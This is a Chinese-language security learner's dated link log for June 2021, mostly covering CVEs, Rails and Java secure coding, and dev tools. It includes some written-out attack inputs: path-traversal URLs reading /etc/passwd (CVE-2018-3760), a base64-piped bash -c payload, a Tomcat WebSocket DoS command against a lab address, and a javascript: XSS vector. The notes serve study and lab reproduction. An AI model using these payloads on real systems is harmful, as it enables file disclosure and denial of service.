# 202106

## 0623

[记一次从未授权页面到 GetShell](https://www.freebuf.com/articles/web/275199.html)

IntelliJ IDEA 简体中文专题教程
https://github.com/judasn/IntelliJ-IDEA-Tutorial
一个全栈增长工程师的练手项目集. A Growth Engineering Idea in Action.
https://github.com/phodal/ideabook

## 0622

nacos-console配置敏感数据持久化加密存储 #492
https://github.com/alibaba/nacos/issues/492
https://github.com/alibaba/nacos/issues/5695
[Summer 2021] Add a plugin SPI for configuration encryption and decryption for Nacos 2.0 #5695


Spring Boot： 加密应用配置文件敏感信息
https://juejin.cn/post/6844903520546586637
Spring Cloud Config 加密和解密
https://blog.csdn.net/qq_40354025/article/details/78269284


[linux的find命令--按时间查找文件](https://blog.csdn.net/ytmayer/article/details/6364739)
fd 好像没有这个

```bash
----(+n)---------|------------(n)--------------|---------(-n)----
   (n+1)*24H前   |    (n+1)*24H ~ n*24H之间  |  n*24H以内
-ctime -n    查找距现在 n*24H 内修改过的文件
-ctime n    查找距现在 n*24H 前, (n+1)*24H 内修改过的文件
-ctime +n    查找距现在 (n+1)*24H 前修改过的文件
[a|c|m]min    [最后访问|最后状态修改|最后内容修改]min 
[a|c|m]time    [最后访问|最后状态修改|最后内容修改]time

#ls -lt    ./  按修改时间顺序查看
#ls -lut ./ 按访问时间顺序查看
```
## 0621

https://www.hacking8.com/bug-product/Ruby-On-Rails/CVE-2018-3760-Ruby-On-Rails-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html

http://www.0-sec.org:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
使用： https://tool.chinaz.com/tools/urlencode.aspx 进行转换
http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
再进行一次转换
http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/../../../../../../etc/passwd

两个变体
```
%2f => /
%252e%252e/ => %2e%2e/ => ../
```

框架安全之Spring渗透
https://www.freebuf.com/vuls/274478.html

如何使用GraphQLmap对GraphQL节点进行渗透测试
https://www.freebuf.com/articles/network/274296.html

CockpitCMS NoSQL注入漏洞分析
https://www.anquanke.com/post/id/241113

## 0619

https://brandnewbox.com/notes/2021/03/form-builders-in-ruby/
Adding Typescript to your Existing Rails App
https://www.honeybadger.io/blog/typescript-rails/
https://gorails.com/episodes/rails-web-components

## 0618

https://vuestic.dev/
https://vuestic.dev/en/getting-started/installation

CVE-2020-13935复现与浅析
https://www.freebuf.com/vuls/256004.html

Apache Tomcat中的WebSocket存在安全漏洞，该漏洞源于程序没有正确验证payload的长度。攻击者可利用该漏洞造成拒绝服务（无限循环）。
Apache Tomcat 10.0.0-M1-10.0.0-M6
Apache Tomcat 9.0.0.M1-9.0.36
Apache Tomcat 8.5.0-8.5.56
Apache Tomcat 7.0.27-7.0.104

```bash
https://hub.docker.com/_/tomcat
docker pull tomcat:9.0.36-jdk11-corretto
docker run -it --rm -p 80:8080 tomcat:9.0.36-jdk11-corretto

# [Docker中启动Tomcat后访问报错："HTTP状态 404 - 未找到"](https://www.cnblogs.com/ccku/p/13442652.html)
sudo docker cp 840bb6c5bc94:/usr/local/tomcat/webapps.dist webapps
docker run -it --rm -v /home/ubuntu/tomcat/webapps:/usr/local/tomcat/webapps -p 80:8080 tomcat:9.0.36-jdk11-corretto
sudo docker exec -it 3e6437dd9980 mv /usr/local/tomcat/webapps.dist /usr/local/tomcat/webapps

# 攻击，取消后，服务器负载不会马上恢复
./tcdos ws://192.168.56.130/examples/websocket/echoStreamAnnotation
```

redis加固
https://help.aliyun.com/knowledge_detail/37447.html
https://help.aliyun.com/noticelist/articleid/1060026197.html

## 0617

Linux权限提升：自动化信息收集
https://www.freebuf.com/articles/network/274223.html

SDK API自动化测试与持续集成
https://www.freebuf.com/sectool/276109.html

## 0616
 5.1 API请求基础
https://www.wangan.com/docs/977

Welcome to SeeCode Scanner’s documentation!
https://seecode-scanner.readthedocs.io/en/latest/index.html

10个国外用于扫描网站安全漏洞和恶意软件的在线免费工具
https://www.coca.cc/zxgj/23.html
360Webscan 网站安全检测
https://webscan.360.cn/
360在线网站安全检测，web安全测试AppScan扫描工具，XSS常用的攻击手法
https://www.cnblogs.com/zdz8207/p/webscan-appscan-xss.html

Apache Shiro历史高危反序列化漏洞预警 （shiro-550、shiro-721）
https://www.huaweicloud.com/notice/2018/20210616155641831.html

https://github.com/chinanf-boy/fd-zh

[Java 命令执行之我见](https://www.anquanke.com/post/id/243329)
http://www.jackson-t.ca/runtime-exec-payloads.html
回答了：为什么要用 `bash -c {echo,ZWNobyAiMTExMSIgPiAxLnR4dA==}|{base64,-d}|{bash,-i}`

CVE-2021-3560
https://access.redhat.com/security/cve/CVE-2021-3560
https://www.bleepingcomputer.com/news/security/linux-system-service-bug-lets-you-get-root-on-most-modern-distros/
https://dbus.freedesktop.org/doc/dbus-send.1.html

## 0615
TODO：深入
如果需要解析 XML 文件，确保实体解析（entity parsing）是关闭的以避免 XXE 攻击。	
如果需要解析 XML 文件，确保实体扩展（entity expansion）是关闭的以避免通过指数实体扩展攻击实现的 Billion Laughs/XML bomb。	

entity parsing 对于java是什么、怎么实现、怎么关闭？

这里有描述：
[java代码审计手书(二）](https://xz.aliyun.com/t/3372)
其它java代码审计
[java代码审计手书(一）](https://xz.aliyun.com/t/3358)
[java代码审计手书(三）](https://xz.aliyun.com/t/3416)
[java代码审计手书(四）](https://xz.aliyun.com/t/3460)
扩展： https://github.com/zhaoweiho/awesome-java-security-checklist
java代码审计文章集合
https://www.cnblogs.com/r00tuser/p/10577571.html
[Java代码审计](https://chenergy1991.github.io/2019/03/24/%E5%A5%BD%E7%9A%84%E9%93%BE%E6%8E%A5/)
  [【绿盟大讲堂】代码审计指南](http://blog.nsfocus.net/code-audit-instruction/)
  [【绿盟大讲堂】 渗透测试流程解析](https://www.shangmayuan.com/a/81c98471b4da476aa78b9075.html)
[Java代码审计](https://yinwc.github.io/2020/01/03/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

[idea安装findbugs及Find-sec-bugs安全组件](https://www.cnblogs.com/kingsonfu/p/12419817.html)
ERROR："Plugin 'FindBugs-IDEA'(version 1.0.1) was explicitly marked as incompatible with the current version of the IDE"
Since FindBugs-IDEA is not compatible with IDEA 2020.1 any more, I personally substitute SpotBugs for it.

好像2019就不再更新，有人推荐 [spotbugs](https://plugins.jetbrains.com/plugin/14014-spotbugs)
The SpotBugs plugin for security audits of Java web applications.
安装：
File/settings/plugins 市场搜索 SpotBugs
https://find-sec-bugs.github.io/ 官方已经说明 `The SpotBugs plugin for security audits of Java web applications.`
安装 find-sec-bugs
https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial

https://avd.aliyun.com/

技术分享 | 快速上手 Golang 编写 PoC&EXP
https://nosec.org/home/detail/4767.html

框架安全之Shiro渗透复现
https://www.freebuf.com/vuls/274305.html

**新型TLS攻击**可对安全站点发起跨站脚本攻击，至少影响140万台web服务器
https://www.freebuf.com/news/277183.html

数据流转安全如何守护（上）
https://www.freebuf.com/articles/database/275248.html

认证与授权详解
https://www.freebuf.com/articles/web/273239.html

《数据安全法》要点解读
https://www.freebuf.com/articles/database/277198.html
（附全文）最新！《数据安全法》表决通过，9月1日起施行
https://www.freebuf.com/news/277111.html
聚焦《中华人民共和国数据安全法》（附全文）
https://www.anquanke.com/post/id/244115

CVE-2021-25217: dhcpd dhclient 栈溢出漏洞
https://access.redhat.com/errata/RHSA-2021:2359

## 0611

RoR:
https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html
https://www.netsparker.com/blog/web-security/preventing-xss-ruby-on-rails-web-applications/
https://brakemanpro.com/2017/09/08/cross-site-scripting-in-rails
https://guides.rubyonrails.org/security.html
https://molily.de/xss/

xss js
https://dev.to/caffiendkitten/innerhtml-cross-site-scripting-agc

java
https://www.baeldung.com/spring-prevent-xss
https://docs.spring.io/spring-security/site/docs/5.1.6.RELEASE/reference/html/web-app-security.html

TODO:
老版本有一个向量拼接的问题，看看4.2有没有？
<%= link_to "Personal Website", @user.website %>
<a href="javascript:alert('Haxored')">Personal Website</a>
新版本：
link_to "Personal Website", 'javascript:alert(1);'.html_safe()
# Will generate:
# "<a href="javascript:alert(1);">Personal Website</a>"

服务器session管理
Project::Application.config.session_store :active_record_store
config.force_ssl = true
devise增加密码复杂度
To enforce password complexity, it is possible to use [zxcvbn gem](https://github.com/bitzesty/devise_zxcvbn). Configure your user model with it:




ReactJS 中的代码注入
https://zhuanlan.zhihu.com/p/28434174
浅谈 React 中的 XSS 攻击
https://segmentfault.com/a/1190000024522392
浅谈 React 中的 XSS 攻击
https://www.zoo.team/article/xss-in-react
jamesarosen/ember-xss.md
https://gist.github.com/jamesarosen/478db5faef370eac43fb

利用 Linux 内核漏洞实现 Docker 逃逸
https://paper.seebug.org/1602/

Bypass of access control in Django
https://github.com/advisories/GHSA-p99v-5w3c-jqq9

Path Traversal in Django
https://github.com/advisories/GHSA-68w8-qjq3-2gfm

Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability
https://github.com/advisories/GHSA-gwcr-j4wh-j3cq

## 0610
细说 sqlmap_api
https://paper.seebug.org/940/

Fastjson-RCE漏洞复现
https://www.anquanke.com/post/id/242330
浅入深出 Reids 攻击方法总结
https://www.anquanke.com/post/id/241146

密码安全那些事儿
https://www.freebuf.com/articles/compliance/274656.html

Httpx：一款针对HTTP的安全研究工具|golang.
https://www.freebuf.com/sectool/273382.html

你的扫描器可以绕过防火墙么？（一）
https://paper.seebug.org/1600/
你的扫描器可以绕过防火墙么？（二）
https://paper.seebug.org/1601/
利用 Linux 内核漏洞实现 Docker 逃逸
https://paper.seebug.org/1602/
## 0609

简单通俗的理解Vue3.0中的Proxy
https://juejin.cn/post/6844904088119853063

https://www.mofa.go.jp/mofaj/ms/pe_ar/page24_000482.html

零信任网络建设及部分细节讨论
https://www.freebuf.com/articles/endpoint/274350.html

FastJson_1.2.24 反序列化漏洞复现+解析
https://www.anquanke.com/post/id/239867

## 0608

[Redis 基于主从复制的 RCE 利用方式](https://paper.seebug.org/975/)

## 0607
https://github.com/q1f3/WooYun-1
一条Fofa搜索语法，实现批量挖洞
https://www.freebuf.com/articles/web/274071.html
https://github.com/tangxiaofeng7/Fofa-collect

记一次Fuzz绕WAF实现SQL 注入
https://www.freebuf.com/articles/web/274492.html

## 0604

A tool for writing better scripts
https://github.com/google/zx?ref=stackshare
> js + 脚本工具

Monty, Mongo tinified. MongoDB implemented in Python !
https://github.com/davidlatwe/montydb?ref=stackshare
用py写的mongodb:?


GitLab信息泄露漏洞（CVE-2021-22180）
http://www.nsfocus.net/vulndb/55163

Ruby参数注入漏洞（CVE-2021-33564）
http://www.nsfocus.net/vulndb/55134

Puma graceful restarts
https://nts.strzibny.name/puma-graceful-restarts/

Gitlab 13.9.3 - Remote Code Execution (Authenticated)
https://www.exploit-db.com/exploits/49944
https://hackerone.com/reports/1125425
Kramdown before 2.3.1 does not restrict Rouge formatters to the Rouge::Formatters namespace, and thus arbitrary classes can be instantiated.
https://gitlab.com/gitlab-org/gitlab/-/commit/179329b5c3c118924fb242dc449d06b4ed6ccb66
https://github.com/advisories/GHSA-52p9-v744-mwjj
https://github.com/gettalong/kramdown/pull/708

由 OAuth 流程后的不安全重定向导致的 Facebook 账号接管
https://www.anquanke.com/post/id/240016
> 还是不太明白
https://ysamm.com/?p=667%EF%BB%BF

MSSQL：我(蹦蹦跳跳地)来了
https://www.anquanke.com/post/id/241805

利用内置加速度计进行手机侧信道窃听攻击
https://www.anquanke.com/post/id/241740

## 0603

CVE(CAN) ID: CVE-2021-33564
http://www.nsfocus.net/vulndb/55134

淘宝/天猫/京东618活动任务助手，养猫猫/喵币/热爱狂欢！秒杀软件/抢购软件。淘宝/天猫/京东/拼多多/苏宁易购/华为商城/小米商城/聚划算/百亿补贴/抖音/快手/直播。手机抢购/茅台抢购/显卡抢购/耐克、阿迪达斯鞋子抢购。38女王节/618/1111/双11/双十一/1212/双12/双十二/年货节
https://github.com/omxmo/qg
## 0602
TIPs：
网站DDOS漏洞查找:
用burpsuite找到延时最高的接口，如果不限制请求，那就是一个DDOS漏洞了

[OpenSSL 常见对称加密算法特性分析](https://www.cnblogs.com/chenxuhua/p/openssl-crypto-method.html)

$ grep aes /proc/cpuinfo 
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm pni pclmulqdq dtes64 est tm2 ssse3 fma cx16 xtpr pdcm pcid sse4_1 sse4_2 movbe popcnt aes xsave osxsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid mpx rdseed adx smap clflushopt ibrs ibpb stibp ssbd

https://ddosecrets.com/wiki/Sberbank_of_Russia

实战|从零开始的SRC挖掘——如何一洞百分
https://www.freebuf.com/articles/web/271678.html

SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list
https://github.com/LandGrey/SpringBootVulExploit

Atlassian Jira 8.15.0 - Information Disclosure (Username Enumeration)
https://www.exploit-db.com/exploits/49924

https://dev.to/christinecontreras/perfect-date-a-javascript-and-api-project-1hng
https://dev.to/mpocock1/state-management-how-to-tell-a-bad-boolean-from-a-good-boolean-260n
https://dev.to/dastasoft/here-s-what-every-react-developer-needs-to-know-about-typescript-part-1-48ob
https://dev.to/eevajonnapanula/don-t-develop-just-for-yourself-a-developer-s-checklist-to-accessibility-545k

## 0601

Linux Audit 子系统解读
https://paper.seebug.org/1594/

Android应用中的常见漏洞总结
https://www.anquanke.com/post/id/241264

2021 年 10 大流行软件测试工具
https://www.infoq.cn/article/W27gag5ImhA9s8RyZju2
Selenium（功能测试）
Ranorex（功能测试）
PractiTest（探索性测试）
LoadNinja（负载测试）
Optimizely（UI/UX）
SonarQube（安全性测试）
Cucumber（验收测试）
SoapUI（API 功能测试）
TestNG（单元测试）
MantisBT（手工测试）
Text Shortcode

与 Nginx 同行，Pipy 究竟有何能耐？
https://www.infoq.cn/article/r79Ubhof5F5LPh4VBCCQ
https://github.com/flomesh-io/pipy

漂亮的代码分享|MIT code2img
https://carbon.now.sh/

Gruff graphing library for Ruby|图表插件
https://github.com/topfunky/gruff

Extralite is an extra-lightweight (~365 lines of C-code) SQLite3 wrapper for Ruby. 
It provides a single class with a minimal set of methods to interact with an SQLite3 database.
https://github.com/digital-fabric/extralite

Using Postgres Row-Level Security in Ruby on Rails|行级安全，解决多租户访问的安全问题
https://pganalyze.com/blog/postgres-row-level-security-ruby-rails

📚 技术面试必备基础知识、Leetcode、计算机操作系统、计算机网络、系统设计
https://github.com/CyC2018/CS-Notes

APPSEC：
BlackDex是一个运行在Android手机上的脱壳工具，支持5.0～12，无需依赖任何环境任何手机都可以使用，包括模拟器。只需几秒，即可对已安装包括未安装的APK进行脱壳。
https://github.com/CodingGay/BlackDex

Windows Package Manager CLI (aka winget)
https://github.com/microsoft/winget-cli

【编程随想】收藏的电子书清单（多个学科，含下载链接）
https://github.com/programthink/books

https://github.com/chinnkarahoi/jd_scripts